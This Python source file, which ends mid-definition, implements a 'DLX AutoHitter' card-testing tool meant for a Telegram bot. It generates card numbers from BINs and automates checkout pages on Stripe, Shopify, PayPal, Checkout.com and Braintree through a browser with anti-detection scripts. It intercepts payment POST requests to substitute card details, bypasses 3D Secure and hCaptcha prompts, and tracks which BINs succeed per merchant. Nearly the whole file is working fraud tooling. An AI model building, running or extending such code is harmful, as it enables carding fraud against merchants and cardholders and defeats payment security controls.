#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DLX AutoHitter — Full implementation with 15+ provider support
Playwright browser automation, anti-detection, smart rate limiting
Adapted for Telegram Bot integration
"""

import re
import json
import time
import random
import asyncio
import requests
import urllib3
from datetime import datetime
from typing import Dict, List, Optional
from collections import defaultdict

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DATABASE = "dlx_hitter.db"
MAX_CONCURRENT = 3
REQUEST_TIMEOUT = 15

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
]


# ============= PROVIDER DETECTION =============
def detect_provider(url: str, html: str = "") -> str:
    """Return provider name based on URL or HTML content."""
    if 'stripe.com' in url:
        return 'stripe'
    if 'checkout.com' in url or 'checkout' in url:
        return 'checkoutcom'
    if 'shopify.com' in url or 'myshopify.com' in url:
        return 'shopify'
    if 'paypal.com' in url or 'paypal' in url:
        return 'paypal'
    if 'braintree' in url or 'braintreegateway.com' in url:
        return 'braintree'
    if 'adyen.com' in url or 'adyen' in url:
        return 'adyen'
    if 'squareup.com' in url or 'square' in url:
        return 'square'
    if 'mollie.com' in url or 'mollie' in url:
        return 'mollie'
    if 'klarna.com' in url or 'klarna' in url:
        return 'klarna'
    if 'authorize.net' in url or 'authorizenet' in url:
        return 'authorizenet'
    if 'woocommerce' in url or 'woocommerce' in html:
        return 'woocommerce'
    if 'bigcommerce.com' in url or 'bigcommerce' in html:
        return 'bigcommerce'
    if 'wix.com' in url or 'wix' in html:
        return 'wix'
    if 'ecwid.com' in url or 'ecwid' in html:
        return 'ecwid'
    if html:
        if 'stripe.com' in html:
            return 'stripe'
        if 'checkout.com' in html or 'Frames' in html:
            return 'checkoutcom'
        if 'Shopify' in html or 'window.Shopify' in html:
            return 'shopify'
        if 'paypal' in html or 'window.paypal' in html:
            return 'paypal'
        if 'braintree' in html or 'Braintree' in html:
            return 'braintree'
        if 'adyen' in html or 'Adyen' in html:
            return 'adyen'
        if 'square' in html or 'Square' in html:
            return 'square'
        if 'mollie' in html or 'Mollie' in html:
            return 'mollie'
        if 'klarna' in html or 'Klarna' in html:
            return 'klarna'
        if 'authorize.net' in html or 'Authorize.Net' in html:
            return 'authorizenet'
    return 'unknown'


# ============= ENHANCED URL ANALYZER =============
class URLAnalyzer:
    @staticmethod
    def _extract_from_scripts(html: str) -> Dict:
        result = {'amount': None, 'product': None, 'merchant': None, 'product_url': None}
        script_pattern = re.compile(r'<script[^>]*>(.*?)</script>', re.DOTALL)
        for script in script_pattern.findall(html):
            patterns = [
                (r'window\.__STRIPE__\s*=\s*({.*?});', 'stripe'),
                (r'window\.__INITIAL_STATE__\s*=\s*({.*?});', 'initial'),
                (r'var\s+stripePaymentData\s*=\s*({.*?});', 'payment'),
                (r'"paymentIntent":({.*?})', 'pi'),
                (r'"paymentMethod":({.*?})', 'pm'),
                (r'"amount":\s*(\d+)', 'amount'),
                (r'"name":\s*"([^"]+)"', 'name'),
                (r'"business_name":\s*"([^"]+)"', 'business'),
                (r'"product_url":\s*"([^"]+)"', 'product_url'),
            ]
            for pat, key in patterns:
                m = re.search(pat, script, re.DOTALL)
                if m:
                    try:
                        if key in ('stripe', 'initial', 'payment', 'pi', 'pm'):
                            data = json.loads(m.group(1))
                            def extract(obj):
                                if isinstance(obj, dict):
                                    if 'amount' in obj and isinstance(obj['amount'], (int, float)):
                                        result['amount'] = obj['amount']
                                    if 'name' in obj and isinstance(obj['name'], str):
                                        result['product'] = obj['name']
                                    if 'business_name' in obj and isinstance(obj['business_name'], str):
                                        result['merchant'] = obj['business_name']
                                    if 'product_url' in obj and isinstance(obj['product_url'], str):
                                        result['product_url'] = obj['product_url']
                                    for v in obj.values():
                                        extract(v)
                                elif isinstance(obj, list):
                                    for item in obj:
                                        extract(item)
                            extract(data)
                        elif key == 'amount':
                            result['amount'] = int(m.group(1))
                        elif key == 'name':
                            result['product'] = m.group(1)
                        elif key == 'business':
                            result['merchant'] = m.group(1)
                        elif key == 'product_url':
                            result['product_url'] = m.group(1)
                    except:
                        pass
        return result

    @staticmethod
    def extract_amount(html: str) -> Optional[str]:
        script_data = URLAnalyzer._extract_from_scripts(html)
        if script_data.get('amount') is not None:
            amount_cents = script_data['amount']
            if isinstance(amount_cents, (int, float)):
                return f"${amount_cents/100:.2f}"
        patterns = [
            r'"amount":(\d+)',
            r'"amount_display":"([^"]+)"',
            r'\$(\d+(?:\.\d{2})?)',
            r'data-amount="(\d+)"',
            r'<span[^>]*class="[^"]*amount[^"]*"[^>]*>\s*[\$€£]?\s*([\d,]+\.?\d*)\s*</span>',
            r'Total:?\s*[\$€£]?\s*([\d,]+\.?\d*)',
            r'price["\']\s*:\s*["\']?\$?([\d,]+\.?\d*)',
            r'"line_items":\[.*?"amount":(\d+).*?\]',
            r'"amount_subtotal":(\d+)',
            r'"total":(\d+)'
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                amount = match.group(1).replace(',', '')
                if amount.isdigit() and len(amount) > 2:
                    return f"${int(amount)/100:.2f}"
                elif amount.replace('.', '').isdigit():
                    return f"${amount}"
        return None

    @staticmethod
    def extract_product_name(html: str) -> Optional[str]:
        script_data = URLAnalyzer._extract_from_scripts(html)
        if script_data.get('product'):
            return script_data['product']
        patterns = [
            r'"name":"([^"]+)"',
            r'<title>(.*?)</title>',
            r'<h1[^>]*>(.*?)</h1>',
            r'"description":"([^"]+)"',
            r'"product_name":"([^"]+)"',
            r'<meta property="og:title" content="([^"]+)"',
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                name = match.group(1).strip()
                name = re.sub(r'\s*[|–-]\s*Stripe.*$', '', name, flags=re.IGNORECASE)
                name = re.sub(r'\s*[|–-]\s*Checkout.*$', '', name, flags=re.IGNORECASE)
                if name and len(name) > 3:
                    return name[:100]
        return None

    @staticmethod
    def extract_product_url(html: str) -> Optional[str]:
        script_data = URLAnalyzer._extract_from_scripts(html)
        if script_data.get('product_url'):
            return script_data['product_url']
        patterns = [
            r'<meta property="og:url" content="([^"]+)"',
            r'<link rel="canonical" href="([^"]+)"',
            r'"product_url":"([^"]+)"',
            r'<a[^>]*href="([^"]+)"[^>]*>.*?product.*?</a>',
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                url = match.group(1).strip()
                if url.startswith('http'):
                    return url
        return None

    @staticmethod
    def extract_merchant(html: str) -> str:
        script_data = URLAnalyzer._extract_from_scripts(html)
        if script_data.get('merchant'):
            return script_data['merchant']
        patterns = [
            r'"business_name":"([^"]+)"',
            r'<title>(.*?)\s*[|–-]\s*(Stripe|Checkout|Shopify|PayPal|Braintree|Adyen|Square|Mollie|Klarna|Authorize\.Net|WooCommerce|BigCommerce|Wix|Ecwid)',
            r'"display_name":"([^"]+)"',
            r'<meta property="og:site_name" content="([^"]+)"',
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                return match.group(1).strip()
        return "Unknown"

    @staticmethod
    def extract_currency(html: str) -> str:
        patterns = [
            r'"currency":"([^"]+)"',
            r'data-currency="([^"]+)"',
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                return match.group(1).upper()
        return "USD"

    @staticmethod
    async def deep_analyze_with_playwright(url: str) -> Dict:
        """Load page with Playwright and extract info after JS execution."""
        result = {
            'merchant': 'Unknown', 'product': 'Unknown', 'product_url': None,
            'amount': None, 'currency': 'USD', 'success': False
        }
        try:
            from playwright.async_api import async_playwright
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True, args=['--disable-blink-features=AutomationControlled', '--no-sandbox'])
                context = await browser.new_context(ignore_https_errors=True)
                page = await context.new_page()
                await page.goto(url, timeout=60000, wait_until='domcontentloaded')
                await asyncio.sleep(3)

                merchant = await page.evaluate('''() => {
                    const meta = document.querySelector('meta[property="og:site_name"]');
                    if (meta) return meta.content;
                    const title = document.title;
                    const match = title.match(/(.+?)\\s*[|–-]\\s*(Stripe|Checkout|Shopify|PayPal|Braintree|Adyen|Square|Mollie|Klarna|Authorize\\.Net|WooCommerce|BigCommerce|Wix|Ecwid)/);
                    if (match) return match[1];
                    return title;
                }''')
                if merchant and merchant not in ['Stripe Checkout', 'Checkout', 'Shopify Checkout', 'PayPal']:
                    result['merchant'] = merchant.strip()

                product = await page.evaluate('''() => {
                    const meta = document.querySelector('meta[property="og:title"]');
                    if (meta) return meta.content;
                    const h1 = document.querySelector('h1');
                    if (h1) return h1.innerText;
                    return document.title;
                }''')
                if product and product not in ['Stripe Checkout', 'Checkout', 'Shopify Checkout']:
                    result['product'] = product.strip()

                product_url = await page.evaluate('''() => {
                    const meta = document.querySelector('meta[property="og:url"]');
                    if (meta) return meta.content;
                    const link = document.querySelector('link[rel="canonical"]');
                    if (link) return link.href;
                    return null;
                }''')
                if product_url:
                    result['product_url'] = product_url

                amount_text = await page.evaluate('''() => {
                    const selectors = ['[data-amount]', '.amount', '.price', '[class*="amount"]', '[class*="price"]'];
                    for (let sel of selectors) {
                        const el = document.querySelector(sel);
                        if (el) {
                            let text = el.innerText || el.getAttribute('data-amount');
                            if (text) return text;
                        }
                    }
                    return null;
                }''')
                if amount_text:
                    match = re.search(r'[\$€£]?\s*([\d,]+\.?\d*)', amount_text)
                    if match:
                        amount = match.group(1).replace(',', '')
                        result['amount'] = f"${amount}"

                currency = await page.evaluate('''() => {
                    const meta = document.querySelector('meta[property="og:price:currency"]');
                    if (meta) return meta.content;
                    const el = document.querySelector('[data-currency]');
                    if (el) return el.getAttribute('data-currency');
                    return null;
                }''')
                if currency:
                    result['currency'] = currency.upper()

                result['success'] = True
                await browser.close()
        except Exception as e:
            result['error'] = str(e)
        return result

    @staticmethod
    async def analyze_url_with_fallback(url: str, use_deep: bool = False) -> Dict:
        result = {
            'url': url, 'merchant': 'Unknown', 'product': 'Unknown',
            'product_url': None, 'amount': None, 'currency': 'USD',
            'provider': 'unknown', 'success': False, 'error': None
        }
        try:
            headers = {'User-Agent': random.choice(USER_AGENTS), 'Accept-Language': 'en-US,en;q=0.9'}
            resp = requests.get(url, timeout=15, verify=False, headers=headers, allow_redirects=True)
            if resp.status_code == 200:
                html = resp.text
                result['provider'] = detect_provider(url, html)
                result['merchant'] = URLAnalyzer.extract_merchant(html)
                result['product'] = URLAnalyzer.extract_product_name(html) or 'Unknown'
                result['product_url'] = URLAnalyzer.extract_product_url(html)
                result['amount'] = URLAnalyzer.extract_amount(html)
                result['currency'] = URLAnalyzer.extract_currency(html)
                result['success'] = True
            else:
                result['error'] = f"HTTP {resp.status_code}"
        except Exception as e:
            result['error'] = str(e)

        if use_deep and (result['merchant'] == 'Unknown' or result['product'] in ['Stripe Checkout', 'Checkout', 'Shopify Checkout']):
            deep = await URLAnalyzer.deep_analyze_with_playwright(url)
            if deep.get('success'):
                if deep['merchant'] != 'Unknown':
                    result['merchant'] = deep['merchant']
                if deep['product'] != 'Unknown':
                    result['product'] = deep['product']
                if deep.get('product_url'):
                    result['product_url'] = deep['product_url']
                if deep.get('amount'):
                    result['amount'] = deep['amount']
                if deep.get('currency', 'USD') != 'USD':
                    result['currency'] = deep['currency']
        return result

    @staticmethod
    def analyze(url: str) -> Dict:
        """Synchronous analyze for bot integration."""
        result = {
            'url': url, 'merchant': 'Unknown', 'product': 'Unknown',
            'product_url': None, 'amount': None, 'currency': 'USD',
            'provider': 'unknown', 'error': None,
        }
        try:
            headers = {'User-Agent': random.choice(USER_AGENTS), 'Accept-Language': 'en-US,en;q=0.9'}
            resp = requests.get(url, timeout=15, verify=False, headers=headers, allow_redirects=True)
            if resp.status_code == 200:
                html = resp.text
                result['provider'] = detect_provider(url, html)
                result['merchant'] = URLAnalyzer.extract_merchant(html)
                result['product'] = URLAnalyzer.extract_product_name(html) or 'Unknown'
                result['product_url'] = URLAnalyzer.extract_product_url(html)
                result['amount'] = URLAnalyzer.extract_amount(html)
                result['currency'] = URLAnalyzer.extract_currency(html)
            else:
                result['error'] = f"HTTP {resp.status_code}"
        except Exception as e:
            result['error'] = str(e)[:80]

        # If static analysis incomplete, try deep analysis
        if result['merchant'] == 'Unknown' or result['product'] in [None, 'Unknown', 'Stripe Checkout', 'Checkout', 'Shopify Checkout']:
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                deep = loop.run_until_complete(URLAnalyzer.deep_analyze_with_playwright(url))
                loop.close()
                if deep.get('success'):
                    if deep['merchant'] != 'Unknown':
                        result['merchant'] = deep['merchant']
                    if deep['product'] != 'Unknown':
                        result['product'] = deep['product']
                    if deep.get('product_url'):
                        result['product_url'] = deep['product_url']
                    if deep.get('amount'):
                        result['amount'] = deep['amount']
                    if deep.get('currency', 'USD') != 'USD':
                        result['currency'] = deep['currency']
            except Exception:
                pass

        return result


# ============= FINGERPRINT =============
class FingerprintGenerator:
    @staticmethod
    def generate() -> Dict:
        return {
            'user_agent': random.choice(USER_AGENTS),
            'viewport': {'width': 1920, 'height': 1080},
            'locale': 'en-US',
            'timezone_id': 'America/New_York'
        }

    @staticmethod
    def get_stealth_script() -> str:
        return """
        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
        window.chrome = { runtime: {} };
        Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
        """


# ============= CARD PATTERN LEARNER =============
class CardPatternLearner:
    def __init__(self):
        self.patterns: Dict[str, Dict[str, Dict]] = defaultdict(dict)

    def learn(self, card: Dict, merchant: str, success: bool):
        bin_pattern = card['card'][:6]
        if merchant not in self.patterns:
            self.patterns[merchant] = {}
        if bin_pattern not in self.patterns[merchant]:
            self.patterns[merchant][bin_pattern] = {'success': 0, 'fail': 0}
        if success:
            self.patterns[merchant][bin_pattern]['success'] += 1
        else:
            self.patterns[merchant][bin_pattern]['fail'] += 1

    def suggest_best_pattern(self, merchant: str) -> Optional[str]:
        if merchant not in self.patterns:
            return None
        best = None
        best_rate = -1
        for pattern, data in self.patterns[merchant].items():
            total = data['success'] + data['fail']
            if total > 0:
                rate = data['success'] / total * 100
                if rate > best_rate and data['success'] >= 2:
                    best_rate = rate
                    best = pattern
        return best


# ============= SMART RATE LIMITER =============
class SmartRateLimiter:
    def __init__(self):
        self.current_delay = 1.0
        self.consecutive_failures = 0

    def calculate_delay(self, last_result: str) -> float:
        if last_result == 'success':
            self.consecutive_failures = 0
            self.current_delay = max(0.5, self.current_delay * 0.9)
        elif last_result == 'declined':
            self.consecutive_failures += 1
            self.current_delay = min(8, self.current_delay * 1.2 + self.consecutive_failures * 0.2)
        return max(0.5, min(10, self.current_delay))


# ============= CARD GENERATOR =============
class CardGenerator:
    @staticmethod
    def get_card_brand(card_number: str) -> str:
        first6 = re.sub(r'\D', '', card_number)[:6]
        if re.match(r'^3[47]', first6): return 'amex'
        if re.match(r'^5[1-5]', first6) or re.match(r'^2[2-7]', first6): return 'mastercard'
        if re.match(r'^4', first6): return 'visa'
        return 'unknown'

    @staticmethod
    def luhn_checksum(card_number: str) -> int:
        def digits_of(n): return [int(d) for d in str(n)]
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        return checksum % 10

    @staticmethod
    def generate_card(bin_number: str) -> Optional[Dict]:
        if not bin_number or len(bin_number) < 4:
            return None
        parts = bin_number.split('|')
        bin_pattern = re.sub(r'[^0-9xX]', '', parts[0])
        test_bin = bin_pattern.replace('x', '0').replace('X', '0')
        brand = CardGenerator.get_card_brand(test_bin)
        target_len = 15 if brand == 'amex' else 16
        cvv_len = 4 if brand == 'amex' else 3
        card = ''
        for c in bin_pattern:
            card += str(random.randint(0, 9)) if c.lower() == 'x' else c
        remaining = target_len - len(card) - 1
        for _ in range(remaining):
            card += str(random.randint(0, 9))
        for i in range(10):
            if CardGenerator.luhn_checksum(card + str(i)) == 0:
                check_digit = i
                break
        else:
            check_digit = 0
        full_card = card + str(check_digit)
        month = f"{random.randint(1, 12):02d}"
        if len(parts) > 1 and parts[1]:
            month = parts[1].zfill(2) if parts[1].lower() != 'xx' else f"{random.randint(1, 12):02d}"
        year = f"{datetime.now().year + random.randint(1, 5):02d}"
        if len(parts) > 2 and parts[2]:
            year = parts[2].zfill(2) if parts[2].lower() != 'xx' else f"{datetime.now().year + random.randint(1, 5):02d}"
        cvv = ''.join(str(random.randint(0, 9)) for _ in range(cvv_len))
        if len(parts) > 3 and parts[3]:
            if parts[3].lower() in ('xxx', 'xxxx'):
                cvv = ''.join(str(random.randint(0, 9)) for _ in range(cvv_len))
            else:
                cvv = parts[3].zfill(cvv_len)
        return {'card': full_card, 'month': month, 'year': year, 'cvv': cvv, 'brand': brand}

    @staticmethod
    def generate_cards(bin_number: str, count: int = 10) -> List[Dict]:
        cards = []
        for _ in range(count):
            card = CardGenerator.generate_card(bin_number)
            if card:
                cards.append(card)
        return cards


# ============= BASE AUTOFILL CLASS =============
class BaseAutofill:
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"
    CARD_SELECTORS = []
    EXPIRY_SELECTORS = []
    CVC_SELECTORS = []
    NAME_SELECTORS = []
    EMAIL_SELECTORS = []
    SUBMIT_SELECTORS = []

    def __init__(self, page):
        self.page = page
        self.real_card = None

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card

    async def find_and_fill_field(self, selectors: List[str], value: str):
        for sel in selectors:
            try:
                element = await self.page.query_selector(sel)
                if element and await element.is_visible():
                    await element.click()
                    await element.fill(value)
                    return True
            except:
                continue
        return False

    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)

    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except:
                continue
        return False

    async def detect_3ds(self) -> bool:
        iframes = await self.page.query_selector_all('iframe[src*="3ds"], iframe[src*="challenge"]')
        for iframe in iframes:
            if await iframe.is_visible():
                return True
        text = await self.page.text_content('body')
        if '3D Secure' in text or 'Authentication' in text:
            return True
        return False

    async def wait_for_3ds(self, timeout: int = 10000) -> bool:
        start = time.time()
        while (time.time() - start) * 1000 < timeout:
            if await self.detect_3ds():
                return True
            await asyncio.sleep(0.5)
        return False

    async def auto_complete_3ds(self) -> bool:
        if not await self.detect_3ds():
            return False
        form = await self.page.query_selector('form')
        if form:
            await form.evaluate('form => form.submit()')
            await asyncio.sleep(3)
            return True
        cont = await self.page.query_selector('button:has-text("Continue"), button:has-text("Submit")')
        if cont:
            await cont.click()
            await asyncio.sleep(3)
            return True
        return False

    async def handle_captcha(self):
        try:
            frame = self.page.frame_locator('iframe[src*="hcaptcha.com"]')
            if frame:
                checkbox = frame.locator('#checkbox').first
                if await checkbox.is_visible():
                    await checkbox.click()
                    await asyncio.sleep(2)
                    return True
        except:
            pass
        return False


# ============= STRIPE AUTOFILL =============
class StripeAutofill(BaseAutofill):
    CARD_SELECTORS = [
        '#cardNumber', '[name="cardNumber"]', '[autocomplete="cc-number"]',
        '[data-elements-stable-field-name="cardNumber"]',
        'input[placeholder*="Card number"]', 'input[placeholder*="card number"]',
        'input[aria-label*="Card number"]', '[class*="CardNumberInput"] input',
        'input[name="number"]', 'input[id*="card-number"]'
    ]
    EXPIRY_SELECTORS = [
        '#cardExpiry', '[name="cardExpiry"]', '[autocomplete="cc-exp"]',
        '[data-elements-stable-field-name="cardExpiry"]',
        'input[placeholder*="MM / YY"]', 'input[placeholder*="MM/YY"]',
        'input[placeholder*="MM"]', '[class*="CardExpiry"] input'
    ]
    CVC_SELECTORS = [
        '#cardCvc', '[name="cardCvc"]', '[autocomplete="cc-csc"]',
        '[data-elements-stable-field-name="cardCvc"]',
        'input[placeholder*="CVC"]', 'input[placeholder*="CVV"]',
        '[class*="CardCvc"] input', 'input[name="cvc"]'
    ]
    NAME_SELECTORS = [
        '#billingName', '[name="billingName"]', '[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]', 'input[name="name"]'
    ]
    EMAIL_SELECTORS = [
        'input[type="email"]', 'input[name*="email"]', 'input[autocomplete="email"]',
        'input[placeholder*="email"]'
    ]
    SUBMIT_SELECTORS = [
        '.SubmitButton', '[class*="SubmitButton"]', 'button[type="submit"]',
        '[data-testid*="submit"]', 'button:has-text("Pay")'
    ]
    MASKED_CARD = "0000000000000000"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "000"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card

        async def intercept_route(route, request):
            if request.method == "POST" and "stripe.com" in request.url:
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace("card[number]=0000000000000000", f"card[number]={self.real_card['card']}")
                    post_data = post_data.replace("card[exp_month]=01", f"card[exp_month]={self.real_card['month']}")
                    post_data = post_data.replace("card[exp_year]=30", f"card[exp_year]={self.real_card['year']}")
                    post_data = post_data.replace("card[cvc]=000", f"card[cvc]={self.real_card['cvv']}")
                    post_data = post_data.replace("card[expiry]=01/30", f"card[expiry]={self.real_card['month']}/{self.real_card['year']}")
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()

        await self.page.route("**/*", intercept_route)


# ============= CHECKOUT.COM AUTOFILL =============
class CheckoutComAutofill(BaseAutofill):
    CARD_SELECTORS = [
        'input[data-frames="card-number"]', '#card-number', 'input[name="cardNumber"]',
        'input[placeholder*="Card number"]', 'input[aria-label*="Card number"]',
        '[data-testid="card-number"]', '#payment-card-number'
    ]
    EXPIRY_SELECTORS = [
        'input[data-frames="expiry-date"]', '#expiry-date', 'input[name="expiry"]',
        'input[placeholder*="MM/YY"]', 'input[placeholder*="MM / YY"]',
        '[data-testid="expiry-date"]'
    ]
    CVC_SELECTORS = [
        'input[data-frames="cvv"]', '#cvv', 'input[name="cvv"]',
        'input[placeholder*="CVC"]', 'input[placeholder*="CVV"]',
        '[data-testid="cvv"]'
    ]
    NAME_SELECTORS = [
        'input[data-frames="name"]', '#name', 'input[name="name"]',
        'input[placeholder*="Name on card"]', '[data-testid="cardholder-name"]'
    ]
    EMAIL_SELECTORS = [
        'input[type="email"]', '#email', 'input[name="email"]',
        'input[placeholder*="email"]'
    ]
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
        'button:has-text("Pay")', 'button:has-text("Submit")'
    ]
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card

        async def intercept_route(route, request):
            if request.method == "POST" and ("checkout.com" in request.url or "api.checkout.com" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    post_data = re.sub(r'"expiryMonth":"01"', f'"expiryMonth":"{self.real_card["month"]}"', post_data)
                    post_data = re.sub(r'"expiryYear":"30"', f'"expiryYear":"{self.real_card["year"]}"', post_data)
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()

        await self.page.route("**/*", intercept_route)


# ============= SHOPIFY AUTOFILL =============
class ShopifyAutofill(BaseAutofill):
    CARD_SELECTORS = [
        '#number', 'input[name="number"]', '[autocomplete="cc-number"]',
        'input[aria-label="Card number"]', '[data-testid="card-number"]',
        'input[placeholder*="Card number"]', '.card-number'
    ]
    EXPIRY_SELECTORS = [
        '#expiry', 'input[name="expiry"]', '[autocomplete="cc-exp"]',
        'input[aria-label="Expiry date"]', '[data-testid="expiry-date"]',
        'input[placeholder*="MM/YY"]', '.expiry-date'
    ]
    CVC_SELECTORS = [
        '#verification_value', 'input[name="verification_value"]', '[autocomplete="cc-csc"]',
        'input[aria-label="Security code"]', '[data-testid="security-code"]',
        'input[placeholder*="CVC"]', '.cvv'
    ]
    NAME_SELECTORS = [
        '#name', 'input[name="name"]', '[autocomplete="cc-name"]',
        'input[aria-label="Name on card"]', '[data-testid="cardholder-name"]'
    ]
    EMAIL_SELECTORS = [
        '#email', 'input[name="email"]', 'input[type="email"]',
        'input[aria-label="Email"]', '[data-testid="email"]'
    ]
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '[data-testid="pay-button"]', '.pay-button',
        'button:has-text("Pay")', 'button:has-text("Complete order")'
    ]
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card

        async def intercept_route(route, request):
            if request.method == "POST" and ("shopify.com" in request.url or "myshopify.com" in request.url or "stripe.com" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    post_data = re.sub(r'credit_card\[number\]=4242424242424242', f'credit_card[number]={self.real_card["card"]}', post_data)
                    post_data = re.sub(r'credit_card\[month\]=01', f'credit_card[month]={self.real_card["month"]}', post_data)
                    post_data = re.sub(r'credit_card\[year\]=30', f'credit_card[year]={self.real_card["year"]}', post_data)
                    post_data = re.sub(r'credit_card\[verification_value\]=123', f'credit_card[verification_value]={self.real_card["cvv"]}', post_data)
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()

        await self.page.route("**/*", intercept_route)


# ============= PAYPAL AUTOFILL =============
class PayPalAutofill(BaseAutofill):
    CARD_SELECTORS = [
        '#card-number', 'input[name="cardNumber"]', '[autocomplete="cc-number"]',
        'input[aria-label="Card number"]', '[data-testid="card-number"]',
        'input[placeholder*="Card number"]'
    ]
    EXPIRY_SELECTORS = [
        '#exp-date', 'input[name="expDate"]', '[autocomplete="cc-exp"]',
        'input[aria-label="Expiration date"]', '[data-testid="expiry-date"]',
        'input[placeholder*="MM/YY"]'
    ]
    CVC_SELECTORS = [
        '#cvv', 'input[name="cvv"]', '[autocomplete="cc-csc"]',
        'input[aria-label="Security code"]', '[data-testid="cvv"]',
        'input[placeholder*="CVC"]'
    ]
    NAME_SELECTORS = [
        '#cardholder-name', 'input[name="cardholderName"]', '[autocomplete="cc-name"]',
        'input[aria-label="Name on card"]', '[data-testid="cardholder-name"]'
    ]
    EMAIL_SELECTORS = [
        '#email', 'input[name="email"]', 'input[type="email"]',
        'input[aria-label="Email"]', '[data-testid="email"]'
    ]
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '[data-testid="pay-button"]', '.pay-button',
        'button:has-text("Pay Now")', 'button:has-text("Pay")'
    ]
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card

        async def intercept_route(route, request):
            if request.method == "POST" and ("paypal.com" in request.url or "braintreegateway.com" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    post_data = re.sub(r'credit_card\[number\]=4242424242424242', f'credit_card[number]={self.real_card["card"]}', post_data)
                    post_data = re.sub(r'credit_card\[expiration_month\]=01', f'credit_card[expiration_month]={self.real_card["month"]}', post_data)
                    post_data = re.sub(r'credit_card\[expiration_year\]=30', f'credit_card[expiration_year]={self.real_card["year"]}', post_data)
                    post_data = re.sub(r'credit_card\[cvv\]=123', f'credit_card[cvv]={self.real_card["cvv"]}', post_data)
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()

        await self.page.route("**/*", intercept_route)


# ============= BRAINTREE AUTOFILL =============
class BraintreeAutofill(BaseAutofill):
    CARD_SELECTORS = [
        'input[data-braintree-name="number"]', '#credit-card-number',
        'input[name="credit_card[number]"]', 'input[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
    ]
    EXPIRY_SELECTORS = [
        'input[data-braintree-name="expiration_date"]', '#expiration-date',
        'input[name="credit_card[expiration_date]"]', 'input[placeholder*="MM/YY"]',
        'input[aria-label="Expiration date"]'
    ]
    CVC_SELECTORS = [
        'input[data-braintree-name="cvv"]', '#cvv',
        'input[name="credit_card[cvv]"]', 'input[placeholder*="CVC"]',
        'input[aria-label="Security code"]'
    ]
    NAME_SELECTORS = [
